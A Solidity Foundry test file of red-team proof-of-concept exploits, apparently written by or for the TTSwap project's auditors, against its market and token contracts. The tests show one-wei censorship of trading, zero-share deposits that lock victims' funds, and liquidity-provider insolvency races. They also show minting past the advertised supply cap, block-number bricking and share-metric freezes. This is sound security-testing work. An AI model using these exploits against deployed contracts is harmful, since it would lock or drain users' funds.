// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.29;

import {BaseSetup} from "../BaseSetup.t.sol";
import {MyToken} from "../../src/test/MyToken.sol";
import {S_GoodTmpState, S_ProofKey} from "../../src/interfaces/I_TTSwap_Market.sol";
import {T_GoodKey, T_GoodKeyLibrary} from "../../src/type/T_GoodKey.sol";
import {L_ProofIdLibrary} from "../../src/libraries/L_Proof.sol";
import {L_GoodConfigLibrary} from "../../src/libraries/L_GoodConfig.sol";
import {TTSwapError} from "../../src/libraries/L_Error.sol";
import {s_share} from "../../src/interfaces/I_TTSwap_Token.sol";
import {
    L_TTSwapUINT256Library,
    toTTSwapUINT256
} from "../../src/libraries/L_TTSwapUINT256.sol";

/// @notice Second-wave red-team PoCs: attack surface that survives the payGood `+1`
///         roundup fix and the default safeLine. Focus: liveness weapons, LP
///         accounting errors, tokenomics leaks — no privileged keys required
///         unless stated per test.
contract RT_SecondWave is BaseSetup {
    using T_GoodKeyLibrary for T_GoodKey;
    using L_TTSwapUINT256Library for uint256;
    using L_ProofIdLibrary for S_ProofKey;
    using L_GoodConfigLibrary for uint256;

    uint128 internal constant USDT_INIT_QTY = uint128(50_000 * 10 ** 6);
    uint128 internal constant USDT_INIT_VALUE = uint128(50_000 * 10 ** 12);
    uint128 internal constant BTC_INIT_QTY = uint128(1 * 10 ** 8);
    uint128 internal constant BTC_INIT_VALUE = uint128(63_000 * 10 ** 12);
    uint128 internal constant MIN_INIT_QTY = 500_000;
    uint128 internal constant MAX_INIT_VALUE = uint128(2 ** 109);

    address internal attacker = address(5);
    address internal victim = address(15);
    address internal trader = address(16);

    uint256 internal usdtGoodId;
    uint256 internal btcGoodId;

    function setUp() public override {
        BaseSetup.setUp();
        vm.warp(100);
        usdtGoodId = _init(_usdtKey(), marketcreator, USDT_INIT_VALUE, USDT_INIT_QTY);
        btcGoodId = _init(_btcKey(), users[1], BTC_INIT_VALUE, BTC_INIT_QTY);
    }

    function _usdtKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(usdt), id: 0});
    }

    function _btcKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(btc), id: 0});
    }

    function _ethKey() internal view returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: address(eth), id: 0});
    }

    function _init(
        T_GoodKey memory key,
        address owner,
        uint128 value,
        uint128 qty
    ) internal returns (uint256 goodId) {
        vm.startPrank(owner);
        deal(key.contractAddress, owner, 100 * uint256(qty), false);
        MyToken(payable(key.contractAddress)).approve(address(market), type(uint256).max);
        market.initGood(key, toTTSwapUINT256(value, qty), defaultdata, owner, defaultdata);
        goodId = key.toId();
        vm.stopPrank();
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-09: 1-wei same-token payGood consumes the good's run-block slot.
    // Any later tx touching the good in the SAME block reverts TTSwapError(46).
    // Cost: gas only (1 wei in, 1 wei back). No safeLine / price dependency.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT09_one_wei_payGood_censors_good_for_block() public {
        _relaxSafeLine(usdtGoodId);
        _relaxSafeLine(btcGoodId);
        _warpToFreshRunSlot();

        // Control: victim swap works in a fresh block.
        deal(address(usdt), victim, 1e9, false);
        vm.startPrank(victim);
        usdt.approve(address(market), type(uint256).max);
        market.buyGood(
            _usdtKey(), _btcKey(), toTTSwapUINT256(uint128(1e6), 0),
            address(0), defaultdata, victim, defaultdata, 0
        );
        vm.stopPrank();

        // --- same block, new attempt: attacker fires first with a 1-wei self-pay ---
        _warpToFreshRunSlot();
        deal(address(usdt), attacker, 1, false);
        vm.startPrank(attacker);
        usdt.approve(address(market), 1);
        uint256 balBefore = usdt.balanceOf(attacker);
        market.payGood(
            _usdtKey(), _usdtKey(), toTTSwapUINT256(0, 1),
            attacker, defaultdata, attacker, defaultdata, 0
        );
        vm.stopPrank();
        assertEq(usdt.balanceOf(attacker), balBefore, "attacker lost nothing (1 wei round trip)");

        // Victim's swap touching USDT in the SAME block now reverts (46).
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 46));
        market.buyGood(
            _usdtKey(), _btcKey(), toTTSwapUINT256(uint128(1e6), 0),
            address(0), defaultdata, victim, defaultdata, 0
        );

        // investGood on USDT is equally blocked.
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 46));
        market.investGood(_usdtKey(), toTTSwapUINT256(0, 1e6), defaultdata, defaultdata, victim);
    }

    function test_RT09_multicall_whole_market_censorship_one_tx() public {
        _relaxSafeLine(usdtGoodId);
        _relaxSafeLine(btcGoodId);
        _warpToFreshRunSlot();

        // Attacker seals BOTH goods in ONE transaction via multicall.
        deal(address(usdt), attacker, 1, false);
        deal(address(btc), attacker, 1, false);
        vm.startPrank(attacker);
        usdt.approve(address(market), 1);
        btc.approve(address(market), 1);
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeCall(
            market.payGood,
            (_usdtKey(), _usdtKey(), toTTSwapUINT256(0, 1), attacker, defaultdata, attacker, defaultdata, 0)
        );
        calls[1] = abi.encodeCall(
            market.payGood,
            (_btcKey(), _btcKey(), toTTSwapUINT256(0, 1), attacker, defaultdata, attacker, defaultdata, 0)
        );
        market.multicall(calls);
        vm.stopPrank();

        // Any swap on either good this block is dead.
        deal(address(usdt), victim, 1e9, false);
        vm.startPrank(victim);
        usdt.approve(address(market), type(uint256).max);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 46));
        market.buyGood(
            _usdtKey(), _btcKey(), toTTSwapUINT256(uint128(1e6), 0),
            address(0), defaultdata, victim, defaultdata, 0
        );
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 46));
        market.buyGood(
            _btcKey(), _usdtKey(), toTTSwapUINT256(uint128(1e4), 0),
            address(0), defaultdata, victim, defaultdata, 0
        );
        vm.stopPrank();
        emit log("RT09: 2 dust self-pays in 1 tx = whole-market swap halt for the block");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-10: investGood mints 0 shares while accepting the deposit.
    // investQty is inflated via goodWelfare (no run-block, no shares minted),
    // so share mint = S * D / I rounds to 0 while the value check (38) still
    // passes on a high-V/Q good. Victim position is permanently bricked:
    // disinvestProof(>0) reverts 41, disinvestProof(0) reverts 26.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT10_investGood_zero_share_deposit_lock() public {
        // Attacker seeds a good at max self-priced V / min Q.
        T_GoodKey memory key = _ethKey();
        uint256 goodId = _init(key, attacker, MAX_INIT_VALUE, MIN_INIT_QTY);
        deal(address(eth), attacker, 1e15, false);
        deal(address(eth), victim, 1e6, false);

        // Attacker inflates investQty 1000x via welfare donation (front-run slot).
        vm.startPrank(attacker);
        eth.approve(address(market), type(uint256).max);
        market.goodWelfare(goodId, 5e11, defaultdata, attacker, defaultdata);
        vm.stopPrank();

        // Victim invests 1e6 tokens. Value check passes (pool price is astronomic),
        // but minted shares floor to 0.
        vm.startPrank(victim);
        eth.approve(address(market), type(uint256).max);
        market.investGood(key, toTTSwapUINT256(0, 1e6), defaultdata, defaultdata, victim);
        vm.stopPrank();

        uint256 proofId = S_ProofKey(victim, goodId).toId();
        uint128 shares = market.getProofState(proofId).shares.amount0();
        assertEq(shares, 0, "victim minted 0 shares");
        assertEq(eth.balanceOf(victim), 0, "victim deposit was taken");

        // Victim can never exit: any share amount reverts.
        vm.prank(victim);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 41));
        market.disinvestProof(proofId, 1, address(0), victim, defaultdata);

        // The bricked deposit is now part of investQty, claimable pro-rata by
        // existing shareholders (here: the attacker, sole LP).
        uint256 attackerBefore = eth.balanceOf(attacker);
        uint256 attackerProof = S_ProofKey(attacker, goodId).toId();
        uint128 attackerShares = market.getProofState(attackerProof).shares.amount0();
        // Attacker exits what's exitable (chips cap shrinks with V each call;
        // raw calls, ignore late reverts - we only care about the net number).
        for (uint256 i = 0; i < 10; i++) {
            vm.prank(attacker);
            (bool ok, ) = address(market).call(
                abi.encodeCall(
                    market.disinvestProof,
                    (attackerProof, attackerShares / 10, address(0), attacker, defaultdata)
                )
            );
            if (!ok) break;
        }
        uint256 attackerOut = eth.balanceOf(attacker) - attackerBefore;
        emit log_named_uint("RT10 attacker in (seed+welfare)", uint256(5e5 + 5e11));
        emit log_named_uint("RT10 attacker out (disinvest)", attackerOut);
        emit log_named_uint("RT10 victim locked deposit", 1e6);
        // Honest accounting: platform/split fees on the phantom donation-profit
        // make full extraction net-negative for the attacker -> this is a
        // fund-lock / griefing weapon, not a theft. Victim funds are stuck forever.
        assertGt(eth.balanceOf(address(market)), 0, "victim tokens remain trapped in market");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-11: FCFS insolvency race. Buys pay out LP principal (physical
    // inventory) while LP claims stay pinned to investQty. After one-sided
    // flow, sum(claims) > physical balance: first LP to exit is made whole,
    // later LPs' disinvest reverts on the token transfer. Multicall makes the
    // per-call disinvestChips cap cosmetic (full exit in one tx).
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT11_one_sided_flow_bricks_late_LPs() public {
        // Fresh skinny ETH good: LP1 seeds 1e6, LP2 (victim) doubles to 2e6.
        uint256 skinnyId = _init(_ethKey(), users[1], BTC_INIT_VALUE, 1e6);
        _relaxSafeLine(usdtGoodId);
        _relaxSafeLine(skinnyId);

        deal(address(eth), victim, 1e6, false);
        vm.startPrank(victim);
        eth.approve(address(market), type(uint256).max);
        market.investGood(_ethKey(), toTTSwapUINT256(0, 1e6), defaultdata, defaultdata, victim);
        vm.stopPrank();

        // Control: without one-sided flow, an LP exit works fine.
        uint256 lp1Proof = S_ProofKey(users[1], skinnyId).toId();
        uint256 lp2Proof = S_ProofKey(victim, skinnyId).toId();
        uint128 lp1Shares0 = market.getProofState(lp1Proof).shares.amount0();
        _warpToFreshRunSlot();
        vm.prank(users[1]);
        market.disinvestProof(lp1Proof, lp1Shares0 / 20, address(0), users[1], defaultdata);
        assertGt(eth.balanceOf(users[1]), 0, "control: LP exits when pool is solvent");

        // One-sided flow: trader sells 7.4e10 USDT and pulls ~30% of the ETH
        // physical inventory out of the pool (safeLineUpper caps the size).
        _warpToFreshRunSlot();
        deal(address(usdt), trader, 7.4e10, false);
        vm.startPrank(trader);
        usdt.approve(address(market), type(uint256).max);
        (uint256 g1change, uint256 g2change) = market.buyGood(
            _usdtKey(), _ethKey(), toTTSwapUINT256(uint128(7.4e10), 0),
            address(0), defaultdata, trader, defaultdata, 0
        );
        vm.stopPrank();
        emit log_named_uint("RT11 value exported from USDT leg", g1change.amount1());
        emit log_named_uint("RT11 ETH bought out", g2change.amount1());

        uint256 physical = eth.balanceOf(address(market));
        S_GoodTmpState memory st = market.getGoodState(skinnyId);
        uint256 claims = st.currentState.amount0();
        emit log_named_uint("RT11 physical ETH left", physical);
        emit log_named_uint("RT11 investQty (LP claims)", claims);
        assertLt(physical, claims, "fractional reserve: claims exceed inventory");

        // Withdrawals pay out of physical inventory FCFS; the chips cap forces
        // a geometric trickle, so exit ORDER decides who eats the shortfall.
        uint256 lp1Recovered = _drainExit(lp1Proof, users[1], skinnyId);
        uint256 lp2Recovered = _drainExit(lp2Proof, victim, skinnyId);
        uint128 lp2SharesLeft = market.getProofState(lp2Proof).shares.amount0();
        emit log_named_uint("RT11 LP1 (early) recovered", lp1Recovered);
        emit log_named_uint("RT11 LP2 (late) recovered", lp2Recovered);
        emit log_named_uint("RT11 LP2 shares still locked", lp2SharesLeft);
        assertGt(lp1Recovered, 8e5, "LP1 (early) made ~whole");
        assertLt(lp2Recovered, 6e5, "LP2 (late) loses >40%");
        assertGt(lp2SharesLeft, 0, "LP2 shares bricked on empty inventory");
        emit log("RT11: late LP cannot exit - FCFS insolvency, no haircut logic");
    }

    /// @dev Exit a proof in legal-sized chunks (chips cap = Q/5 virtual) until
    ///      shares run out or disinvest reverts. Returns tokens recovered.
    function _drainExit(uint256 proofId, address owner, uint256 goodId) internal returns (uint256) {
        uint256 balBefore = eth.balanceOf(owner);
        uint128 sharesLeft = market.getProofState(proofId).shares.amount0();
        for (uint256 i = 0; i < 80 && sharesLeft > 0; i++) {
            uint256 q = market.getGoodState(goodId).currentState.amount1();
            uint128 cap = uint128(((q / 5) * 9) / 10); // 90% of chips cap
            uint128 chunk = sharesLeft < cap ? sharesLeft : cap;
            if (chunk == 0) break;
            vm.prank(owner);
            (bool ok, ) = address(market).call(
                abi.encodeCall(
                    market.disinvestProof,
                    (proofId, chunk, address(0), owner, defaultdata)
                )
            );
            if (!ok) break;
            sharesLeft -= chunk;
        }
        return eth.balanceOf(owner) - balBefore;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-12: _stakeFee floor of 1e12 mints staking rewards FOREVER, even after
    // totalSupply reaches the advertised 2e20 cap. Hard cap is fictional.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT12_post_cap_perpetual_inflation() public {
        uint256 CAP = 200_000_000_000_000_000_000;
        vm.prank(marketcreator); // DAO admin
        tts_token.mint(marketcreator, CAP);
        assertEq(tts_token.totalSupply(), CAP, "at advertised cap");

        // Attacker (granted callMintTTS, same precondition class as RT-04)
        // stakes once, then harvests the floor-drip daily.
        vm.prank(marketcreator);
        tts_token.setCallMintTTS(attacker, true);
        vm.prank(attacker);
        tts_token.stake(attacker, 1e18);

        vm.warp(block.timestamp + 86401);
        vm.prank(attacker);
        tts_token.unstake(attacker, 1e18);

        uint256 minted = tts_token.balanceOf(attacker);
        emit log_named_uint("RT12 minted past cap in one day", minted);
        assertGt(tts_token.totalSupply(), CAP, "hard cap exceeded via stake drip");
        assertEq(minted, 1e12, "floor drip = 1e12/day at ratio 10000");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-13: fresh goods carry lastRunSlot = 0, so at block.number % 4095 == 0
    // EVERY untouched good fails _checkGoodActive for one full block.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT13_fresh_good_bricked_at_block_mod_4095_zero() public {
        // usdtGoodId was initialized in setUp and never traded since:
        // its lastRunSlot is still the genesis value 0.
        uint256 target = ((block.number / 4095) + 1) * 4095; // == 0 mod 4095
        vm.roll(target);

        deal(address(usdt), victim, 1e8, false);
        vm.startPrank(victim);
        usdt.approve(address(market), type(uint256).max);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 46));
        market.investGood(_usdtKey(), toTTSwapUINT256(0, 1e8), defaultdata, defaultdata, victim);
        vm.stopPrank();
        emit log("RT13: untouched good bricked for the whole block N%4095==0");
    }

    // ─────────────────────────────────────────────────────────────────────────
    // RT-14a: shareMint metric is unbounded; at metric >= 128 the price-check
    // argument `2**metric * 2**128` overflows -> that share's remaining
    // leftamount is frozen forever.
    // RT-14b: addShare merge takes max(metric): a dust share with metric=120
    // silently poisons a large share (8 mints from permanent freeze).
    // Bonus: with no TTS good initialized, lowerprice((0,0),...) == false, so
    // the shareMint price gate is vacuously open.
    // ─────────────────────────────────────────────────────────────────────────

    function test_RT14_shareMint_metric_freezes_leftamount() public {
        vm.prank(marketcreator);
        tts_token.setEnv(address(market_proxy));

        // List a TTS good at the maximum price the market admits (V=2^109, Q=5e5).
        vm.startPrank(marketcreator);
        tts_token.mint(marketcreator, 1e8); // DAO admin mint
        tts_token.approve(address(market), type(uint256).max);
        T_GoodKey memory ttsKey = T_GoodKey({
            ercType: 1,
            contractAddress: address(tts_token),
            id: 0
        });
        market.initGood(ttsKey, toTTSwapUINT256(MAX_INIT_VALUE, MIN_INIT_QTY), defaultdata, marketcreator, defaultdata);
        vm.stopPrank();

        // Control: low metric mints fine at this (max) price.
        vm.prank(marketcreator);
        tts_token.addShare(s_share({leftamount: 1e6, metric: 10, chips: 10}), victim);
        vm.prank(victim);
        tts_token.shareMint();
        assertGt(tts_token.balanceOf(victim), 0, "control: low metric mints");

        // Attacker's share at metric 94: one mint left before the price gate
        // closes FOREVER. At metric 95 the required TTS price exceeds the
        // maximum expressible pool price (2^109 / 5e5) -> 68 forever.
        vm.prank(marketcreator);
        tts_token.addShare(s_share({leftamount: 1e6, metric: 94, chips: 10}), attacker);
        vm.prank(attacker);
        tts_token.shareMint(); // metric 94 -> 95
        assertGt(tts_token.balanceOf(attacker), 0);

        vm.prank(attacker);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 68));
        tts_token.shareMint();

        (uint128 left,,) = _shareOf(attacker);
        assertGt(left, 0, "unminted allocation frozen forever");
        emit log_named_uint("RT14a: leftamount frozen at metric=95 (max price can't satisfy gate)", left);
    }

    function test_RT14_addShare_merge_metric_poisoning() public {
        vm.startPrank(marketcreator);
        tts_token.addShare(s_share({leftamount: 1e6, metric: 1, chips: 10}), victim);
        // Dust share with max metric merges UP the victim's metric.
        tts_token.addShare(s_share({leftamount: 1, metric: 120, chips: 1}), victim);
        vm.stopPrank();

        (, uint120 metric, uint8 chips) = _shareOf(victim);
        assertEq(metric, 120, "metric poisoned to 120");
        assertEq(chips, 10, "chips kept max");
        // metric 120 > 95 -> no expressible pool price can ever satisfy the
        // shareMint gate again (see RT14a). One dust share = instant freeze.
        emit log("RT14b: dust merge at metric=120 -> victim share can never mint again");
    }

    function _shareOf(
        address who
    ) internal view returns (uint128 leftamount, uint120 metric, uint8 chips) {
        s_share memory s = tts_token.usershares(who);
        return (s.leftamount, s.metric, s.chips);
    }
}
